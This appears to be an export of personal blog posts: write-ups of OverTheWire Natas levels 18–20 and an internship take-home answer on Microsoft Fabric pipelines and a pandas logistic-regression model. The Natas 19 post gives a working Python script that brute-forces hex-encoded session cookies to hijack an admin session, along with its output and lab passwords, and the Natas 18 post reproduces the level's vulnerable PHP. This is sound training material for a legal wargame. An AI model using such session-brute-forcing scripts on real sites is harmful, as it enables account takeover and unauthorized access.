[{"categories":["Overthewire","Natas"],"contents":"Login Username: natas20\nPassword: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\nURL: http://natas20.natas.labs.overthewire.org\nDoc Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium. Source.\nBurp Suite tutorial and usefull guides:\nPort Swigger.\nSolution The index page of natas 20 gives a quick prompt of You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. It is the same premise as for natas 19.\n","date":"2024-09-10T11:59:40+03:00","permalink":"//localhost:1313/post/natas20/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 20"},{"categories":["Assignment"],"contents":"Premise Overview This technical project is designed to evaluate your technical skills, creativity, and problem-solving abilities in both Data Engineering and Artificial Intelligence. The project will help us assess how well you understand the concepts and tools you\u0026rsquo;ll be working with during the internship. The project should take no more than 2 to 3 hours to complete.\nProject Description You are tasked with designing a simple data pipeline using Microsoft Fabric and performing data science tasks using Python. Most likely, you don\u0026rsquo;t have experience with Microsoft Fabric. We\u0026rsquo;re interested in how your mind works when you have to face a challenge like this. Microsoft Fabric is a comprehensive data analytics platform that integrates data engineering, data science, data warehousing, and business intelligence in one environment. By using Microsoft Fabric, we expect our interns to gain hands-on experience with a tool that Microsoft expects to be widely adopted in the industry. This exposure not only makes you more competitive in the job market but also prepares you for real-world scenarios where you are likely to encounter similar integrated platforms.\nMicrosoft Fabric is a paid tool, so in order to solve these exercises, you have to simply read the documentation to have an introduction to the tool, watch a few tutorials if needed and answer the questions based on your findings and your prior knowledge from University courses. You don\u0026rsquo;t need to access Fabric for this basic assignment. You don\u0026rsquo;t have to implement the solution, only to design it based on the documentation that you read. You can use text descriptions or any type of visual representation to answer the questions (e.g. Dataflow diagrams) for Section 1. For Section 2 you can implement the solution for free using Google Colab or any other local python environment.\nThe project is divided into two main sections: Data Engineering and Artificial Intelligence.\nSection 1 Scenario You are a new data engineer at a retail company. The company has a dataset containing information on customer transactions. Your task is to design and implement a data pipeline that ingests, processes, and stores this data using Microsoft Fabric.\nThe dataset is available here: https://www.kaggle.com/datasets/fahadrehman07/retail-transaction-dataset?resource=download\nTask 1 premise Question: First, you have to bring this data into Fabric. How do you envision this? What will be the expected steps? How exactly will it be stored? Is the data in a suitable format and size to ingest in Fabric? What can you do related to storage in order to improve the performance of the future data queries if the size of the dataset is expected to grow in time (hint: e.g. partition the data)? (Answer with text descriptions or diagrams)\nTask 1 solution Firstly, I will begin by looking at the data set given in the premise in order to get a feeling for what I am working with.\nThe data set is presented in csv format and has a size of around 13MB (important for later). It seems to be a retail transaction data set, basically offering you a peek at common consumer purchase patterns with the present columns being : CustomerId, ProductId, Quantity, Price, TransactionDate, PaymentMethod, StoreLocation, ProductCategory, AppliedDiscount and TotalAmount.\nSince the data set is given in csv format which is compatible with the import feature of Microsoft Fabric and the size is not significant, the import should be pretty straight forward. We should plan for further expansion tho.\nOkay, how how do I import it? Firstly, in what? A quick look around google later, the most obvious choice was between a Data Lake or a Data Warehouse. I would go with a Data Warehouse since it is meant for already structured data (exactly like my data set) while a Data Lake is more inclined towards raw data meant for analysis and further implications in various projects. Source.\nIn order to import this data into Microsoft Fabric we could setup a pipeline. Pipeline setup:\nConfigure an automated data pipeline within Microsoft Fabric. Source : We should point the pipeline towards the source location of the csv file. Transformation : We should always think about transforming data when we are doing an import in order to further suit our needs, for example remove unnecessary columns or filter just what we need. Destination : Finally, we set the pipeline to store the ingested data into our Data Warehouse, as explained earlier. Source. What can you do related to storage in order to improve the performance of the future data queries if the size of the dataset is expected to grow in time (hint: e.g. partition the data)?\nSince the ingested data is stored in a Data Warehouse, it is prone to efficient querying. In order to further improve the performance, from my work experience, I would suggest partitioning the data by TransactionDate and possibly by ProductId. Additionally, converting the data into Parquet format will improve storage efficiency. Source.\nData flow diagram : Task 2 premise Question: Like most of the datasets you\u0026rsquo;ll find in your practice, this dataset has some data issues that should be corrected. You need to find a way within Microsoft Fabric to perform the following transformations:\nSeparate TransactionDate column in 2 distinct columns for Date and Time.\nAggregate the TotalAmount spent by each customer per month.\nReplace the \u0026ldquo;Home Decor\u0026rdquo; values from the ProductCategory column with \u0026ldquo;Home Products\u0026rdquo;.\nCreate a new column HighValueCustomer that is a boolean column that assigns True or False based on your own rule. Think about a rule with a logic that makes sense in the context.\nLoad the transformed data into a new table in your Data Lake.\nHow do you envision solving this based on your research on Microsoft Fabric? No implementation is needed.\n(Answer with text descriptions, images or diagrams).\nTask 2 solution Separate TransactionDate into 2 columns. As I explained previously, before sending the ingested data to the Data Warehouse we should parse it through a Data Transformation step. In order to achieve what is asked, there are Microsoft data pipeline capabilities that could get the expected result. Data pipelines in Fabric are designed to allow for complex data manipulations and transformations as part of the data flow. Within the pipeline, we could add a transformation step for the received data. Fabric allows for transformations through both low-code/no-code interfaces and SQL-based transformations and for this task, I think that a simple SQL snippet should suffice. Source.\nSQL snippet : SELECT CustomerID, ProductID, Quantity, Price, CAST(TransactionDate AS DATE) AS Date, CAST(TransactionDate AS TIME) AS Time, etc. FROM RetailTransactions Explanation : Casting the datetime variable as DATE and TIME respectively, we will only get the DATE and TIME part of the initial value.\nAggregate the TotalAmount spent by each customer per month. The first step would be separating the Year and the Month values from TransactionDate in order to differentiate between the entries. We should use a transformation step in the pipepline to create new entries just like we did last time.\nSQL snippet : SELECT CustomerId, YEAR(TransactionDate) AS Year, MONTH(TransactionDate) AS Month, TotalAmount FROM RetailTransactions Now that we have extracted the relevant information, we could agregate the TotalAmount for each customer on a monthly basis.\nStep 1 : Add an aggregation component to the pipeline.\nStep 2 : Configure the aggregation component.\nSQL snippet : SELECT CustomerId, YEAR(TransactionDate) AS Year, MONTH(TransactionDate) AS Month, SUM(TotalAmount) AS TotalSpent FROM RetailTransactions GROUP BY CustomerId, YEAR(TransactionDate), MONTH(TransactionDate); This basically just sums the TotalAmount based on each month.\nAs always, after getting the result we should do some data validation in order to make sure that we have consistency.\nReplace the \u0026ldquo;Home Decor\u0026rdquo; values from the ProductCategory column with \u0026ldquo;Home Products\u0026rdquo;. This will be pretty straight forward since we could just use a case when statement. We should insert a transformation component in the pipeline with the directive of changing the values in ProductCategory just when the case is met.\nSQL snippet : CASE WHEN ProductCategory = \u0026#39;Home Decor\u0026#39; THEN \u0026#39;Home Products\u0026#39; ELSE ProductCategory END AS ProductCategory Create a new column HighValueCustomer that is a boolean column that assigns True or False based on your own rule. Think about a rule with a logic that makes sense in the context. The goal for this task is to create a HighValueCustomer column in my database. A simple rule I would personally think of would be that a customer who has spent more than 10k should be moved to the High Value Customer status. Using a data pipeline we could add a data transformation step in order to filter our customers based on our new created rule.\nSQL snippet : SELECT CustomerId, SUM(TotalAmount) AS TotalSpent FROM RetailTransactions GROUP BY CustomerId; And in order to actually sort the data and filter for the sum greater than 10k we could do something like this :\nSQL snippet : CASE WHEN TotalSpent \u0026gt; 10000 THEN \u0026#39;True\u0026#39; ELSE \u0026#39;False\u0026#39; END AS HighValueCustomer Load the transformed data into a new table in your Data Lake. As I explained earlier, I would use a Data Warehouse but the process of transforming the data into a new table should be identical. Firstly, defining the table is crucial. The table should have the same fields i.e. CustomerId, Year and so on and if we are using a pipeline, the pipeline can include a step that automatically creates the table based on the schema defined by my transformed data.\nTask 3 solution Question: How will you use Microsoft Fabric to create a simple dashboard? After doing a little bit of research, the most obvious first step in creating this sort of dashboard should be sanitizing and validating the data. After you are sure that the data you are working with is indeed accurate we should exploit the fact that Microsoft Fabric integrates with Power BI. We could navigate to the Power BI section in Microsoft Fabric and simply choose Create and then Report. The next obvious step would be connecting this Report to the prepared dataset stored in our Data Warehouse. The final step is just using the Get Data feature in Power BI in order to ingest the stored data. Now all that is left to do is design an intuitive layout in order to display your findings. I also created a mock dashboard implementation.\nA chart for total monthly sales by product category \u0026amp; a chart showing the number of HighValueCustomers over time.\nSection 2 Task 1 Load the data you created into a Pandas DataFrame. Create new features such as the total amount spent in the last 3 months, the average transaction amount, and the number of distinct product categories purchased, etc. Create a target variable IsHighValueNextMonth which is True if the customer becomes a HighValueCustomer in the next month, otherwise False. Clean the dataset if needed.\nSolution : Let`s start by loading the csv data into a dataframe in order to see if it picks it up.\nCode : import pandas as pd # Load phase df = pd.read_csv(\u0026#39;Retail_Transaction_Dataset.csv\u0026#39;) # Convert TransactionDate to datetime df[\u0026#39;TransactionDate\u0026#39;] = pd.to_datetime(df[\u0026#39;TransactionDate\u0026#39;]) # Simple sort df.sort_values(by=[\u0026#39;CustomerID\u0026#39;, \u0026#39;TransactionDate\u0026#39;], inplace=True) # Print check print(df.head()) Code run : 06:03:38 archie@Archie randomPy → python3 ai.py CustomerID ProductID Quantity Price TransactionDate PaymentMethod StoreLocation ProductCategory DiscountApplied(%) TotalAmount 81519 14 A 5 60.649721 2023-08-06 06:45:00 Credit Card Unit 3258 Box 4585\\nDPO AE 23889 Books 15.504050 256.232791 80034 42 B 7 88.861581 2023-05-19 21:52:00 PayPal 565 Ashlee Lock\\nStephaniefort, CA 33648 Home Decor 19.191090 502.656523 24358 49 A 1 25.152676 2023-06-05 13:10:00 Debit Card USCGC Anthony\\nFPO AP 93458 Electronics 14.923377 21.399047 57189 59 B 4 37.424038 2023-08-19 03:50:00 Debit Card USCGC Carpenter\\nFPO AE 70852 Clothing 6.736390 139.612036 86585 59 D 8 14.867200 2024-04-01 01:06:00 Debit Card 1854 Bailey Dam\\nWest April, NC 97920 Home Decor 7.614866 109.880660 The next step should be implementing the new features. Since they are simple interogations and sorts it shouldn`t be very difficult.\nTotal spent in the last 3 months : df[\u0026#39;TotalSpentLast3Months\u0026#39;] = df.groupby(\u0026#39;CustomerID\u0026#39;).apply( lambda x: x.set_index(\u0026#39;TransactionDate\u0026#39;).rolling(\u0026#39;90D\u0026#39;)[\u0026#39;TotalAmount\u0026#39;].sum() ).reset_index(level=0, drop=True) Average transaction amount : df[\u0026#39;AvgTransactionAmount\u0026#39;] = df.groupby(\u0026#39;CustomerID\u0026#39;)[\u0026#39;TotalAmount\u0026#39;].expanding().mean().reset_index(level=0, drop=True) Number of distinct categories : distinct_categories = [] categories_set = set() for category in df[\u0026#39;ProductCategory\u0026#39;]: categories_set.add(category) distinct_categories.append(len(categories_set)) df[\u0026#39;DistinctCategories\u0026#39;] = distinct_categories Now, we should create a target variable IsHighValueNextMonth which is true if the customer will become high value in the next month.\nFirstly, let`s create the IsHighValueNextMonth column based on the threshold :\nhigh_value_threshold = 10000 monthly_spending[\u0026#39;IsHighValueCustomer\u0026#39;] = monthly_spending[\u0026#39;TotalAmount\u0026#39;] \u0026gt; high_value_threshold We need to shift the column in order to create the target variable :\nmonthly_spending[\u0026#39;IsHighValueNextMonth\u0026#39;] = monthly_spending.groupby(\u0026#39;CustomerID\u0026#39;)[\u0026#39;IsHighValueCustomer\u0026#39;].shift(-1) Now all that is left to do is merge back into the original dataframe, sanitize the data and check our code for errors.\ndf = pd.merge(df, monthly_spending[[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;, \u0026#39;IsHighValueNextMonth\u0026#39;]], how=\u0026#39;left\u0026#39;, on=[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;]) df[\u0026#39;IsHighValueNextMonth\u0026#39;] = df[\u0026#39;IsHighValueNextMonth\u0026#39;].fillna(False) df.dropna(inplace=True) Code run : CustomerID TransactionDate TotalAmount IsHighValueNextMonth 0 14 2023-08-06 06:45:00 256.232791 False 1 42 2023-05-19 21:52:00 502.656523 False 2 49 2023-06-05 13:10:00 21.399047 False 3 59 2023-08-19 03:50:00 139.612036 False 4 59 2024-04-01 01:06:00 109.880660 False 5 65 2023-06-18 10:29:00 548.006625 False 6 87 2023-08-21 15:23:00 41.515905 False 7 96 2024-04-06 12:35:00 194.356816 False 8 98 2023-12-20 11:49:00 166.934647 False 9 100 2023-05-13 17:17:00 710.062576 False Task 2 Split the data into training and testing sets. Train a simple model of your choice (e.g., Logistic Regression or Decision Tree) to predict IsHighValueNextMonth. Evaluate the model using appropriate metrics such as accuracy, precision, and recall.\nLet`s break down the implementation step by step. Firstly I loaded the data and only used a small batch since otherwise the process would be killed for intense operations.\ndf = pd.read_csv(\u0026#39;Retail_Transaction_Dataset.csv\u0026#39;) df = df.sample(frac=0.1, random_state=42) # Use 10% Then, I applied a datetime conversion in order to facilitate date-based operations.\ndf[\u0026#39;TransactionDate\u0026#39;] = pd.to_datetime(df[\u0026#39;TransactionDate\u0026#39;]) After the previous implementation of high value sort, we should prepare the data for modeling.\nX = df.drop(columns=[\u0026#39;IsHighValueNextMonth\u0026#39;, \u0026#39;CustomerID\u0026#39;, \u0026#39;TransactionDate\u0026#39;, \u0026#39;YearMonth\u0026#39;]) y = df[\u0026#39;IsHighValueNextMonth\u0026#39;] encoder = OneHotEncoder(sparse_output=True, drop=\u0026#39;first\u0026#39;) X_sparse = encoder.fit_transform(X) The dataset is split into training and testing sets, with 70% of the data used for training and 30% for testing.\nX_train, X_test, y_train, y_test = train_test_split(X_sparse, y, test_size=0.3, random_state=42) A logistic regression model is initialized and trained using the training data.\nmodel = LogisticRegression(max_iter=1000) model.fit(X_train, y_train) Predictions are made on the testing set (X_test) using the trained logistic regression model.\ny_pred = model.predict(X_test) Then, the model is evaluated using accuracy, precision, and recall metrics, which are standard for classification tasks.\naccuracy = accuracy_score(y_test, y_pred) precision = precision_score(y_test, y_pred) recall = recall_score(y_test, y_pred) print(f\u0026#39;Accuracy: {accuracy:.2f}\u0026#39;) print(f\u0026#39;Precision: {precision:.2f}\u0026#39;) print(f\u0026#39;Recall: {recall:.2f}\u0026#39;) conf_matrix = confusion_matrix(y_test, y_pred) class_report = classification_report(y_test, y_pred) print(\u0026#34;\\nConfusion Matrix:\u0026#34;) print(conf_matrix) print(\u0026#34;\\nClassification Report:\u0026#34;) print(class_report) Task 3 Propose at least one creative feature that could improve the model\u0026rsquo;s performance. Implement this feature and re-evaluate the model.\nTo improve the model\u0026rsquo;s performance, we can introduce a new feature that provides additional information about the customers\u0026rsquo; behavior. One such creative feature could be the Change in Spending Behavior over the past few months. This feature could capture whether a customer\u0026rsquo;s spending has increased, decreased, or remained stable, which might be a strong indicator of whether they will become a high-value customer in the next month.\nIn order to implement this, we should just calculate the change in spending behavior and then merge the data back into the original dataframe.\nCode : # Calculation monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;] = monthly_spending.groupby(\u0026#39;CustomerID\u0026#39;)[\u0026#39;TotalAmount\u0026#39;].shift(1) monthly_spending[\u0026#39;SpendingChange\u0026#39;] = (monthly_spending[\u0026#39;TotalAmount\u0026#39;] - monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;]) / monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;] monthly_spending[\u0026#39;SpendingChange\u0026#39;].fillna(0, inplace=True) # Replace NaN values with 0 (e.g., for the first month) # Merge df = pd.merge(df, monthly_spending[[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;, \u0026#39;IsHighValueNextMonth\u0026#39;, \u0026#39;SpendingChange\u0026#39;]], how=\u0026#39;left\u0026#39;, on=[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;]) Suggest a potential business use case for the predictive model in a retail environment.\nThe predictive model can be used to identify customers who are likely to become high-value in the next month, allowing retailers to target these customers with personalized promotions and product recommendations. This strategy can boost customer engagement, increase sales, and improve overall customer retention.\nFull code for this section : import pandas as pd from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.metrics import accuracy_score, precision_score, recall_score, confusion_matrix, classification_report from sklearn.preprocessing import OneHotEncoder from scipy.sparse import csr_matrix df = pd.read_csv(\u0026#39;Retail_Transaction_Dataset.csv\u0026#39;) df = df.sample(frac=0.1, random_state=42) df[\u0026#39;TransactionDate\u0026#39;] = pd.to_datetime(df[\u0026#39;TransactionDate\u0026#39;]) df.sort_values(by=[\u0026#39;CustomerID\u0026#39;, \u0026#39;TransactionDate\u0026#39;], inplace=True) df[\u0026#39;YearMonth\u0026#39;] = df[\u0026#39;TransactionDate\u0026#39;].dt.to_period(\u0026#39;M\u0026#39;) monthly_spending = df.groupby([\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;])[\u0026#39;TotalAmount\u0026#39;].sum().reset_index() high_value_threshold = 100 monthly_spending[\u0026#39;IsHighValueCustomer\u0026#39;] = monthly_spending[\u0026#39;TotalAmount\u0026#39;] \u0026gt; high_value_threshold monthly_spending[\u0026#39;IsHighValueNextMonth\u0026#39;] = monthly_spending.groupby(\u0026#39;CustomerID\u0026#39;)[\u0026#39;IsHighValueCustomer\u0026#39;].shift(-1) monthly_spending[\u0026#39;IsHighValueNextMonth\u0026#39;] = monthly_spending[\u0026#39;IsHighValueNextMonth\u0026#39;].fillna(False) monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;] = monthly_spending.groupby(\u0026#39;CustomerID\u0026#39;)[\u0026#39;TotalAmount\u0026#39;].shift(1) monthly_spending[\u0026#39;SpendingChange\u0026#39;] = (monthly_spending[\u0026#39;TotalAmount\u0026#39;] - monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;]) / monthly_spending[\u0026#39;PrevMonthSpending\u0026#39;] monthly_spending[\u0026#39;SpendingChange\u0026#39;].fillna(0, inplace=True) df = pd.merge(df, monthly_spending[[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;, \u0026#39;IsHighValueNextMonth\u0026#39;, \u0026#39;SpendingChange\u0026#39;]], how=\u0026#39;left\u0026#39;, on=[\u0026#39;CustomerID\u0026#39;, \u0026#39;YearMonth\u0026#39;]) df.dropna(inplace=True) X = df.drop(columns=[\u0026#39;IsHighValueNextMonth\u0026#39;, \u0026#39;CustomerID\u0026#39;, \u0026#39;TransactionDate\u0026#39;, \u0026#39;YearMonth\u0026#39;]) y = df[\u0026#39;IsHighValueNextMonth\u0026#39;] encoder = OneHotEncoder(sparse_output=True, drop=\u0026#39;first\u0026#39;) X_sparse = encoder.fit_transform(X) X_train, X_test, y_train, y_test = train_test_split(X_sparse, y, test_size=0.3, random_state=42) model = LogisticRegression(max_iter=1000) model.fit(X_train, y_train) y_pred = model.predict(X_test) accuracy = accuracy_score(y_test, y_pred) precision = precision_score(y_test, y_pred) recall = recall_score(y_test, y_pred) print(f\u0026#39;Accuracy: {accuracy:.2f}\u0026#39;) print(f\u0026#39;Precision: {precision:.2f}\u0026#39;) print(f\u0026#39;Recall: {recall:.2f}\u0026#39;) conf_matrix = confusion_matrix(y_test, y_pred) class_report = classification_report(y_test, y_pred) print(\u0026#34;\\nConfusion Matrix:\u0026#34;) print(conf_matrix) print(\u0026#34;\\nClassification Report:\u0026#34;) print(class_report) ","date":"2024-08-30T16:03:22+03:00","permalink":"//localhost:1313/post/tecknoworks_challange/","section":"post","tags":["Completed"],"title":"Tecknoworks-Intenship challange"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas19\nPassword: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\nURL: http://natas19.natas.labs.overthewire.org\nDoc What is brute-forcing?\nIn cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\nWhat is python?\nPython is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\nWhat is a cookie?🍪\nHTTP cookies are small blocks of data created by a web server while a user is browsing a website and placed on the user\u0026rsquo;s computer or other device by the user\u0026rsquo;s web browser. Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user\u0026rsquo;s device during a session.\nTools CyberChef\nSolution This level seems identical so far with natas18, the only notable difference present being the fact that the prompt tells us that now, session ID`s are no longer sequential. Let`s look at the cookies for a second in order to see what is being stored. As we can see, this time the PHPSESSID variable seems to contain a HEX encoded string. Using cyberchef we can see how it is being translated and what data it communicates. As you can see, the format seems to be the following SessionId+loginUser. You can play a bit with the format by deleting characters in the initial HEX encoding in order to sepparate the part we are interested in. As you can see, I`ve managed to sepparate the -admin part out of the final string, this will be helpful later. What`s the idea? To solve this, the first thing that came to mind was:\nAlways append the -admin part to the string that is composed from the SessionId, and we will progressively parse through id`s until the response we get from the server is not the generic:\nWe can modify the python script from the previous level to achieve this goal since the backcode for this level is identical. It is important to remember that the string has to be encoded into HEX in order for the cookie to be valid. Python script: import requests import binascii url = \u0026#34;http://natas19.natas.labs.overthewire.org\u0026#34; # Set up a session with basic auth s = requests.Session() s.auth = (\u0026#39;natas19\u0026#39;, \u0026#39;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\u0026#39;) def try_login(session_id): # Convert session ID to a hex-encoded string tmp = f\u0026#34;{session_id}-admin\u0026#34; val = binascii.hexlify(tmp.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;ascii\u0026#39;) # Set up the cookie cookies = {\u0026#39;PHPSESSID\u0026#39;: val} # Send the request response = s.get(url, cookies=cookies) # Check if the response indicates non-admin access if \u0026#34;Login as an admin to retrieve\u0026#34; in response.text: print(f\u0026#34;Trying: {session_id} - Failed\u0026#34;) return False else: print(f\u0026#34;Success with session ID: {session_id}\u0026#34;) print(response.text) return True # Iterate over possible session IDs for x in range(640): if try_login(x): break And the running process of this script should be identical to the previous one. The execution might take a little while.\nScript execution: 01:12:45 archie@Archie py → python3 pythonscript.py Trying: 0 - Failed Trying: 1 - Failed Trying: 2 - Failed Trying: 3 - Failed Trying: 4 - Failed Trying: 5 - Failed Trying: 6 - Failed Trying: 7 - Failed . . . Trying: 274 - Failed Trying: 275 - Failed Trying: 276 - Failed Trying: 277 - Failed Trying: 278 - Failed Trying: 279 - Failed Trying: 280 - Failed Success with session ID: 281 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas19\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas19\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt; This page uses mostly the same code as the previous level, but session IDs are no longer sequential... \u0026lt;/b\u0026gt; \u0026lt;/p\u0026gt; You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas20 Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As you can see, we`ve got the password for natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\n","date":"2024-08-27T12:53:35+03:00","permalink":"//localhost:1313/post/natas19/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 19"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas18\nPassword: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\nURL: http://natas18.natas.labs.overthewire.org\nDoc What is brute-forcing?\nIn cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\nWhat is python?\nPython is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\nWhat is php?\nPHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.\nSolution Firstly, the index page of natas18 displays a standard login prompt, asking you for a username and a password to login.\nLet`s take a look under the hood: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas18\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas18\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\u0026#34;username\u0026#34;] == \u0026#34;admin\u0026#34;) { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } /* }}} */ function isValidID($id) { /* {{{ */ return is_numeric($id); } /* }}} */ function createID($user) { /* {{{ */ global $maxid; return rand(1, $maxid); } /* }}} */ function debug($msg) { /* {{{ */ if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { print \u0026#34;DEBUG: $msg\u0026lt;br\u0026gt;\u0026#34;; } } /* }}} */ function my_session_start() { /* {{{ */ if(array_key_exists(\u0026#34;PHPSESSID\u0026#34;, $_COOKIE) and isValidID($_COOKIE[\u0026#34;PHPSESSID\u0026#34;])) { if(!session_start()) { debug(\u0026#34;Session start failed\u0026#34;); return false; } else { debug(\u0026#34;Session start ok\u0026#34;); if(!array_key_exists(\u0026#34;admin\u0026#34;, $_SESSION)) { debug(\u0026#34;Session was old: admin flag set\u0026#34;); $_SESSION[\u0026#34;admin\u0026#34;] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\u0026#34;admin\u0026#34;, $_SESSION) and $_SESSION[\u0026#34;admin\u0026#34;] == 1) { print \u0026#34;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026#34;; print \u0026#34;\u0026lt;pre\u0026gt;Username: natas19\\n\u0026#34;; print \u0026#34;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026#34;; } else { print \u0026#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\u0026#34;; } } /* }}} */ $showform = true; if(my_session_start()) { print_credentials(); $showform = false; } else { if(array_key_exists(\u0026#34;username\u0026#34;, $_REQUEST) \u0026amp;\u0026amp; array_key_exists(\u0026#34;password\u0026#34;, $_REQUEST)) { session_id(createID($_REQUEST[\u0026#34;username\u0026#34;])); session_start(); $_SESSION[\u0026#34;admin\u0026#34;] = isValidAdminLogin(); debug(\u0026#34;New session started\u0026#34;); $showform = false; print_credentials(); } } if($showform) { ?\u0026gt; \u0026lt;p\u0026gt; Please login with your admin account to retrieve credentials for natas19. \u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 